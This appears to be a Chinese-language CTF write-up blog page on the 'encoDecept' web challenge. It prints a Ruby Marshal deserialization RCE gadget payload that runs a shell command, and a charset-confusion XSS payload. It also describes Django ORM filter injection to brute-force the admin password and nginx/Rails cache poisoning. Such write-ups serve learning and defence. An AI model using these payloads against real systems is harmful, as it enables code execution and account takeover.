@@ -1,0 +1,220 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>encoDecept-writeup | sU94r's blog</title><meta name="author" content="j499er"><meta name="copyright" content="j499er"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="step1 frontend发现一个很明显的序列化和反序列化的操作重要的是反序列化content &#x3D; Marshal.load(@template[&#39;data&#39;]) if @template[&#39;data&#39;]其中data是可控的dockerfile中写到了ruby版本是3.4，去搜索3.4的universal gadget发现poc本地运行发现可以成功触发命令执行,但">
+<meta property="og:type" content="article">
+<meta property="og:title" content="encoDecept-writeup">
+<meta property="og:url" content="https://noobctfer.github.io/2024/12/19/encoDecept-writeup/index.html">
+<meta property="og:site_name" content="sU94r&#39;s blog">
+<meta property="og:description" content="step1 frontend发现一个很明显的序列化和反序列化的操作重要的是反序列化content &#x3D; Marshal.load(@template[&#39;data&#39;]) if @template[&#39;data&#39;]其中data是可控的dockerfile中写到了ruby版本是3.4，去搜索3.4的universal gadget发现poc本地运行发现可以成功触发命令执行,但">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://noobctfer.github.io/img/pika.png">
+<meta property="article:published_time" content="2024-12-19T03:19:01.000Z">
+<meta property="article:modified_time" content="2024-12-19T09:15:27.656Z">
+<meta property="article:author" content="j499er">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://noobctfer.github.io/img/pika.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://noobctfer.github.io/2024/12/19/encoDecept-writeup/index.html"><link rel="preconnect" href="//unpkg.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://unpkg.com/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'encoDecept-writeup',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/pika.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-inbox"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/resources"><i class="fa-fw fas fa-download"></i><span> 资源</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/background.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/pika.png" alt="Logo"><span class="site-name">sU94r's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">encoDecept-writeup</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-inbox"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/resources"><i class="fa-fw fas fa-download"></i><span> 资源</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">encoDecept-writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-19T03:19:01.000Z" title="发表于 2024-12-19 11:19:01">2024-12-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-19T09:15:27.656Z" title="更新于 2024-12-19 17:15:27">2024-12-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/university-CTF-2024/">university-CTF-2024</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2024/12/19/encoDecept-writeup/" data-flag-title="encoDecept-writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h3><span id="step1-frontend发现一个很明显的序列化和反序列化的操作">step1 frontend发现一个很明显的序列化和反序列化的操作</span></h3><p>重要的是反序列化<br><code>content = Marshal.load(@template[&#39;data&#39;]) if @template[&#39;data&#39;]</code><br>其中data是可控的<br>dockerfile中写到了ruby版本是3.4，去搜索3.4的universal gadget发现<a target="_blank" rel="noopener" href="https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/blob/main/marshal/3.4-rc/marshal-rce-ruby-3.4-rc.rb">poc</a><br>本地运行发现可以成功触发命令执行,但是服务器的data是json里面解析出来的，json不能包含字节码，不过我们可以用unicode的等价形式:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Marshal</span>.load(<span class="string">&quot;\u0004\b[\u0007c\u0015Gem::SpecFetcherU:\u0011Gem::Version[\u0006o:\u001eGem::RequestSet::Lockfile\n:\t@seto:\u0014Gem::RequestSet\u0006:\u0015@sorted_requests[\u0007o:%Gem::Resolver::SpecSpecification\u0006:\n@speco:$Gem::Resolver::GitSpecification\u0007:\f@sourceo:\u0015Gem::Source::Git\n:\t@gitI\&quot;\bzip\u0006:\u0006ET:\u000f@referenceI\&quot;\u0010/etc/passwd\u0006;\u0010T:\u000e@root_dirI\&quot;\t/tmp\u0006;\u0010T:\u0010@repositoryI\&quot;\bany\u0006;\u0010T:\n@nameI\&quot;\bany\u0006;\u0010T;\u000bo:!Gem::Resolver::Specification\u0007;\u0014I\&quot;\bany\u0006;\u0010T:\u0012@dependencies[\u0000o;\n\u0006;\u000bo;\f\u0007;\ro;\u000e\n;\u000fI\&quot;\bzip\u0006;\u0010T;\u0011I\&quot;*-TmTT=\&quot;$(id&gt;/tmp/marshal-poc)\&quot;any.zip\u0006;\u0010T;\u0012I\&quot;\t/tmp\u0006;\u0010T;\u0013I\&quot;\bany\u0006;\u0010T;\u0014I\&quot;\bany\u0006;\u0010T;\u000bo;\u0015\u0007;\u0014I\&quot;\bany\u0006;\u0010T;\u0016[\u0000;\u0016[\u0000:\u0013@gem_deps_fileI\&quot;\u0019/home/hacker/Desktop\u0006;\u0010T:\u0012@gem_deps_dirI\&quot;\u0011/home/hacker\u0006;\u0010T:\u000f@platforms[\u0000&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>仍然会触发命令执行，unicode在json中是可以接受的<br>因此，我们要想办法控制服务器触发我们的data</p>
+<h3><span id="step2-寻找触发方法">step2 寻找触发方法</span></h3><p>进一步看看代码会发现前端最终数据还是发到python的后端去处理的，python后端设置了只要administrator才能编辑constract template，我们有一个<br>constract administrator的bot是可控的。找遍代码没发现能改role的地方，所以只能尝试去改admin的password或者直接获取了。<br>其实有一个非常隐蔽的漏洞藏在python后端中，我们的bot最多只能访问FilteredContractsView，这个view有一个Contract.objects.filter(**filtered_data)<br>参数如果是可控的，那么我们可以用django特殊的ORM过滤条件，有什么用呢？constract model中的owner是个user的外键，admin就在user库中，因此我们能直接用特<br>殊语法去过滤user库，其中有一个xxx__startswith的特殊过滤方法，我们能直接去过滤admin的password，一个个地试出来admin的密码。<br>    问题在于这个请求必须是post，但是我们的bot是以get来发送，我们也不能让bot去访问我们的网站，执行我们的js来发post，因为那样bot不会发cookie，所以还是得找<br>点网站内的xss，可以是反射的或者存储的，网站有一个markdown渲染的bio，这个我们正好可以编辑，但是markdown过滤了”和&gt;，没办法嵌入事件或者script,我当时一直找不出来解决方法，赛后去网上搜了一下，发现了别人的解决方法（真不知道他们怎么发现的）</p>
+<h3><span id="step3-找到xss利用点">step3  找到xss利用点</span></h3><p>后面的部分应该是这个题最难的地方，第一个，题的作者在contract_frontend&#x2F;lib&#x2F;remove_charset_middleware.rb里面把charset过滤掉了，这很隐蔽，但是也很可<br>疑，实际上，这是能导致xss的，参考这篇文章<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/"></a></p>
+<p>我们可以发现几个点：</p>
+<ol>
+<li>%1b(J —&gt; JIS X 0201 1976  这个编码下ascii的\会被浏览器解释成￥,造成转义字符丢失，从而我们可以闭合”或者’等等<br>%1b(B  —–&gt;Ascii<br>%1b$@    ——-&gt; JIS X 0208 1978  这个编码下两个字符(假设原来是ascii，一个字符1B)会被拼接并且解码成一个字符，这样可以吞掉&gt;或者”<br>%1b$B   ——–&gt;  JIS X 0208 1978 1983</li>
+<li>上面的编码规则触发依赖于服务器没有用meta或者charset标头来明确指示浏览器应该如何去解码，这样会触发浏览器的自动监测机制（chrome ,edge都能生效）</li>
+<li>验证方法：本地创建一个html<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="symbol">&amp;lt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;inJIS%20X%200208%201978&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;$@sfnalk&quot;</span>&gt;</span>   (BswichToAscii<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;onerror=alert(1)//&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;ignoredAlt&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+然后查看document.characterSet</li>
+</ol>
+<p>对于本题，不要在框里直接提交，会被二次编码，用burp或者python提交<code>bio=&lt;![%1b$@sfnalk](inJIS+X+0208+1978)+++%1b%28BswichToAscii![ignoredAlt](+++onerror=alert(1)//)</code><br>就能弹窗<br>解释一下上面的代码，先是用JIS X 0208 1978吞掉”然后切换回ascii使后面的脚本能正常被浏览器解析,&#x2F;&#x2F;注释掉多余的&gt;和”</p>
+<h3><span id="step4">step4</span></h3><p>我们的setting要让constract admin看到,这就会有问题，因为setting页面是根据cookie来返回的，bot不会看到我们的setting<br>解决办法是cache poisoning，nginx.conf中有如下配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.(css|js|jpg|jpeg|png|gif|ico|woff|woff2|ttf|svg|eot|html|json)$ &#123;</span><br><span class="line">            proxy_cache my_cache;</span><br><span class="line">            proxy_cache_key &quot;$uri$is_args$args&quot;;</span><br><span class="line">            proxy_cache_valid 200 5m;</span><br><span class="line">            proxy_cache_valid 404 1m;</span><br><span class="line"></span><br><span class="line">            proxy_pass http://127.0.0.1:3000;</span><br><span class="line"></span><br><span class="line">            proxy_set_header Host $http_host; # Pass original host and port</span><br><span class="line">            proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line"></span><br><span class="line">            proxy_http_version 1.1;</span><br><span class="line">            add_header X-Cache-Status $upstream_cache_status;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>它会把url+参数作为缓存的key然后缓存指定后缀的内容，如果我们缓存了我们的setting页面，那么就可以让bot看到，但是显然setting是动态页面，不以静态后缀结尾。<br>这就要用到nginx和rail解析路径的差异，实际上rail把url中.后面的内容当作返回的view的类型（html，css,根据后缀，默认是html,比如&#x2F;a.css是css，&#x2F;b.hhh是html）（如果那个路由确实不存在）,除此之外，还有一些差异（对本题无用）.<br><img src="/img/4d39-article-noramlization_table.png"><br><img src="/img/9cf7-article-hash_delimiter.png"><br>这个差异可以让nginx缓存我们的setting页面,只要访问&#x2F;settings.css?useless&#x3D;1就好，然后bot也访问这个的时候缓存存在，nginx不会转发到3000端口，会直接返回缓存的页面，不需要cookie认证，从而在缓存的页面触发xss</p>
+<p>本文只讲思路，poc就不给了<br><a href="/files/university-CTF/web_encoDecept_v2.zip">源代码</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://noobctfer.github.io">j499er</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://noobctfer.github.io/2024/12/19/encoDecept-writeup/">https://noobctfer.github.io/2024/12/19/encoDecept-writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://noobctfer.github.io" target="_blank">sU94r's blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/pika.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://unpkg.com/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://unpkg.com/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width no-desc" href="/2024/12/18/breaking-bad-writeup/" title="breaking_bad-writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">breaking_bad-writeup</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/pika.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">j499er</div><div class="author-info-description">curiosity pushes technique forward</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/noobctfer"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/noobctfer" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">step1 frontend发现一个很明显的序列化和反序列化的操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">step2 寻找触发方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">step3  找到xss利用点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">step4</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/19/encoDecept-writeup/" title="encoDecept-writeup">encoDecept-writeup</a><time datetime="2024-12-19T03:19:01.000Z" title="发表于 2024-12-19 11:19:01">2024-12-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/18/breaking-bad-writeup/" title="breaking_bad-writeup">breaking_bad-writeup</a><time datetime="2024-12-18T06:15:21.000Z" title="发表于 2024-12-18 14:15:21">2024-12-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/17/Armaxis-writeup/" title="Armaxis-writeup">Armaxis-writeup</a><time datetime="2024-12-17T13:16:32.000Z" title="发表于 2024-12-17 21:16:32">2024-12-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/11/linkvortex-writeup/" title="linkvortex-writeup">linkvortex-writeup</a><time datetime="2024-12-11T02:07:07.000Z" title="发表于 2024-12-11 10:07:07">2024-12-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/10/files/" title="一些有用的资源列表">一些有用的资源列表</a><time datetime="2024-12-10T10:56:37.000Z" title="发表于 2024-12-10 18:56:37">2024-12-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'A3w8iHUklSxlnechrHppSu55-gzGzoHsz',
+      appKey: '353fETJcLAQnsDCp9AdmMuCI',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      visitor: true,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://unpkg.com/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://unpkg.com/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://unpkg.com/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://unpkg.com/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
